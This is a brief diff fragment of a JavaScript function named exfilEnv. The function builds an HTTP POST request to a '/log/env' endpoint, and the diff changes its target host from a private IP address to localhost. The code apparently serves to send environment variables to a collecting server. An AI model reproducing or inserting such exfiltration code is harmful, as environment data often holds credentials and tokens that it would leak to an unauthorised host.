@@ -37,7 +37,7 @@ function exfilEnv() {
 
   const req = http.request(
     {
-      hostname: "10.215.116.159",
+      hostname: "localhost",
       port: 4000,
       path: "/log/env",
       method: "POST",
